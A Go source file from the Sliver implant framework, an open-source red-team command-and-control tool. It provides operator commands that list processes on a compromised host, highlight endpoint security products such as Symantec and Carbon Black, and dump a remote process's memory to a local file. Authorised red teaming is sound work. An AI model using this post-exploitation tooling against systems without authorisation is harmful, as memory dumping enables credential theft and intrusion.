package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/bishopfox/sliver/client/spin"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

var (
	// Stylizes known processes in the `ps` command
	knownProcs = map[string]string{
		"ccSvcHst.exe": red, // SEP
		"cb.exe":       red, // Carbon Black
	}
)

func ps(ctx *grumble.Context, rpc RPCServer) {
	pidFilter := ctx.Flags.Int("pid")
	exeFilter := ctx.Flags.String("exe")
	ownerFilter := ctx.Flags.String("owner")

	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	data, _ := proto.Marshal(&sliverpb.PsReq{SliverID: ActiveSliver.Sliver.ID})
	resp := <-rpc(&sliverpb.Envelope{
		Type: sliverpb.MsgPsReq,
		Data: data,
	}, defaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"Error: %s", resp.Err)
		return
	}
	ps := &sliverpb.Ps{}
	err := proto.Unmarshal(resp.Data, ps)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}

	outputBuf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)

	fmt.Fprintf(table, "pid\tppid\texecutable\towner\t\n")
	fmt.Fprintf(table, "%s\t%s\t%s\t%s\t\n",
		strings.Repeat("=", len("pid")),
		strings.Repeat("=", len("ppid")),
		strings.Repeat("=", len("executable")),
		strings.Repeat("=", len("owner")),
	)

	lineColors := []string{}
	for _, proc := range ps.Processes {
		var lineColor = ""
		if pidFilter != -1 && proc.Pid == int32(pidFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if exeFilter != "" && strings.HasPrefix(proc.Executable, exeFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if ownerFilter != "" && strings.HasPrefix(proc.Owner, ownerFilter) {
			lineColor = printProcInfo(table, proc)
		}
		if pidFilter == -1 && exeFilter == "" && ownerFilter == "" {
			lineColor = printProcInfo(table, proc)
		}

		// Should be set to normal/green if we rendered the line
		if lineColor != "" {
			lineColors = append(lineColors, lineColor)
		}
	}
	table.Flush()

	for index, line := range strings.Split(outputBuf.String(), "\n") {
		if len(line) == 0 {
			continue
		}
		// We need to account for the two rows of column headers
		if 0 < len(line) && 2 <= index {
			lineColor := lineColors[index-2]
			fmt.Printf("%s%s%s\n", lineColor, line, normal)
		} else {
			fmt.Printf("%s\n", line)
		}
	}

}

// printProcInfo - Stylizes the process information
func printProcInfo(table *tabwriter.Writer, proc *sliverpb.Process) string {
	color := normal
	if modifyColor, ok := knownProcs[proc.Executable]; ok {
		color = modifyColor
	}
	if ActiveSliver.Sliver != nil && proc.Pid == ActiveSliver.Sliver.PID {
		color = green
	}
	fmt.Fprintf(table, "%d\t%d\t%s\t%s\t\n", proc.Pid, proc.Ppid, proc.Executable, proc.Owner)
	return color
}

func procdump(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	pid := ctx.Flags.Int("pid")
	name := ctx.Flags.String("name")

	cmdTimeout := time.Duration(ctx.Flags.Int("timeout")) * time.Second

	if pid == -1 && name != "" {
		pid = getPIDByName(name, rpc)
	}
	if pid == -1 {
		fmt.Printf(Warn + "Invalid process target\n")
		return
	}

	if ctx.Flags.Int("timeout") < 1 {
		fmt.Printf(Warn + "Invalid timeout argument\n")
		return
	}

	ctrl := make(chan bool)
	go spin.Until("Dumping remote process memory ...", ctrl)
	data, _ := proto.Marshal(&sliverpb.ProcessDumpReq{
		SliverID: ActiveSliver.Sliver.ID,
		Pid:      int32(pid),
		Timeout:  int32(ctx.Flags.Int("timeout")),
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: sliverpb.MsgProcessDumpReq,
		Data: data,
	}, cmdTimeout)
	ctrl <- true
	<-ctrl

	procDump := &sliverpb.ProcessDump{}
	proto.Unmarshal(resp.Data, procDump)
	if procDump.Err != "" {
		fmt.Printf(Warn+"Error %s\n", procDump.Err)
		return
	}

	hostname := ActiveSliver.Sliver.Hostname
	f, err := ioutil.TempFile("", fmt.Sprintf("procdump_%s_%d_*", hostname, pid))
	if err != nil {
		fmt.Printf(Warn+"Error creating temporary file: %v\n", err)
	}
	f.Write(procDump.GetData())
	fmt.Printf(Info+"Process dump stored in %s\n", f.Name())
}

func getPIDByName(name string, rpc RPCServer) int {
	data, _ := proto.Marshal(&sliverpb.PsReq{SliverID: ActiveSliver.Sliver.ID})
	resp := <-rpc(&sliverpb.Envelope{
		Type: sliverpb.MsgPsReq,
		Data: data,
	}, defaultTimeout)
	ps := &sliverpb.Ps{}
	proto.Unmarshal(resp.Data, ps)
	for _, proc := range ps.Processes {
		if proc.Executable == name {
			return int(proc.Pid)
		}
	}
	return -1
}
